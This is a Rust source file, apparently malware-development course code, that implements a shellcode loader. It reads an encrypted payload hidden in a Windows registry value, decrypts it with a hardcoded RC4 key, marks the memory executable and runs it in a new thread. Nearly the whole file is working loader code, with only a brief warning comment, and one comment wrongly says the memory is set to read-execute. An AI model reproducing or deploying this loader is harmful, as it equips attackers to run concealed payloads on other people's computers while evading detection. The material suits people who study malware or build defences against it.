extern crate winapi;

// This program retrieves raw bytes from a Windows Registry value,
// decrypts them with RC4, and executes the result as shellcode
// in the current process via a new thread. Executing arbitrary
// bytes as code is inherently dangerous; use only in controlled,
// authorized, and isolated environments.

// Symmetric RC4 key used to decrypt the bytes fetched from the Registry.
const RC4_KEY: [u8; 16] = [
    0x0E, 0x56, 0x75, 0xA4, 0x26, 0x66, 0x80, 0x10,
    0x78, 0xE8, 0xD4, 0xCA, 0x67, 0x03, 0x06, 0xE3,
];

fn main() -> Result<(), String> {
    // Read raw bytes from HKCU\\<subkey>="Control Panel", value="MalDevAcademy".
    // The `size` parameter specifies the maximum expected payload length.
    let data = read_registry_value("Control Panel", "MalDevAcademy", 460)?;

    // Decrypt the payload in memory using RC4. RC4 is symmetric; applying
    // the same function with the same key both encrypts and decrypts.
    let mut decrypted = data.clone();
    rc4_crypt(&mut decrypted, &RC4_KEY);
    println!("[+] Decrypted {} bytes", decrypted.len());

    // Execute the decrypted bytes as shellcode. This is unsafe by nature
    // because it treats untyped bytes as executable instructions.
    unsafe {
        run_shellcode(&decrypted)?;
    }

    Ok(())
}

// Fetches a value from HKCU using `RegGetValueA` and returns its raw bytes.
// - `subkey`: relative path under HKCU (e.g., "Control Panel").
// - `value`: value name containing the bytes.
// - `size`: maximum expected size to read.
fn read_registry_value(subkey: &str, value: &str, size: u32) -> Result<Vec<u8>, String> {
    use std::ffi::CString;
    use winapi::shared::winerror::ERROR_SUCCESS;
    use winapi::um::winreg::{RegGetValueA, HKEY_CURRENT_USER, RRF_RT_ANY};
    use winapi::ctypes::c_void;

    let subkey = CString::new(subkey).unwrap();
    let value = CString::new(value).unwrap();
    let mut buf_size = size;
    let mut buffer = vec![0u8; size as usize];

    // Query the Registry for the value's data into the provided buffer.
    let status = unsafe {
        RegGetValueA(
            HKEY_CURRENT_USER,
            subkey.as_ptr(),
            value.as_ptr(),
            RRF_RT_ANY,
            std::ptr::null_mut(),
            buffer.as_mut_ptr() as *mut c_void,
            &mut buf_size,
        )
    };

    if status != ERROR_SUCCESS as i32 {
        return Err(format!("RegGetValueA failed: {}", status));
    }

    // Trim the vector to the number of bytes actually read.
    buffer.truncate(buf_size as usize);
    Ok(buffer)
}

// Allocates RW memory, copies the bytes, flips protection to RX, then
// starts a new thread at the buffer address and waits for completion.
// Marked `unsafe` because it performs raw pointer operations and executes
// untyped bytes as code, which the compiler cannot verify for safety.
unsafe fn run_shellcode(shellcode: &[u8]) -> Result<(), String> {
    use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
    use winapi::um::processthreadsapi::CreateThread;
    use winapi::um::synchapi::WaitForSingleObject;
    use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
    use winapi::shared::basetsd::SIZE_T;
    use winapi::shared::minwindef::DWORD;
    use winapi::um::winbase::INFINITE;

    // Reserve+commit a RW memory region to host the payload.
    let addr = unsafe {
        VirtualAlloc(
            std::ptr::null_mut(),
            shellcode.len() as SIZE_T,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };
    if addr.is_null() {
        return Err("VirtualAlloc failed".into());
    }

    // Copy the payload bytes into the allocated region.
    unsafe {
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), addr.cast(), shellcode.len());
    }

    let mut old: DWORD = 0;
    // Switch the memory protection to RX so the CPU can execute it.
    if unsafe { VirtualProtect(addr, shellcode.len() as SIZE_T, PAGE_EXECUTE_READWRITE, &mut old) } == 0 {
        return Err("VirtualProtect failed".into());
    }

    // Start a new thread at the beginning of the buffer (thread entry).
    let thread = unsafe {
        CreateThread(
            std::ptr::null_mut(),
            0,
            Some(std::mem::transmute(addr)),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        )
    };
    if thread.is_null() {
        return Err("CreateThread failed".into());
    }

    // Block until the payload thread exits.
    unsafe {
        WaitForSingleObject(thread, INFINITE);
    }
    Ok(())
}

// In-place RC4 stream cipher (KSA + PRGA). Applying this function with the
// same `key` to ciphertext yields the original plaintext (and vice versa).
fn rc4_crypt(data: &mut [u8], key: &[u8]) {
    let mut s: Vec<u8> = (0..=255).collect();
    let mut j: usize = 0;

    // Key-scheduling algorithm (KSA)
    for i in 0..256 {
        j = (j + s[i] as usize + key[i % key.len()] as usize) % 256;
        s.swap(i, j);
    }

    let mut i = 0;
    j = 0;
    // Pseudo-random generation algorithm (PRGA)
    for byte in data.iter_mut() {
        i = (i + 1) % 256;
        j = (j + s[i] as usize) % 256;
        s.swap(i, j);
        let k = s[(s[i] as usize + s[j] as usize) % 256];
        *byte ^= k;
    }
}
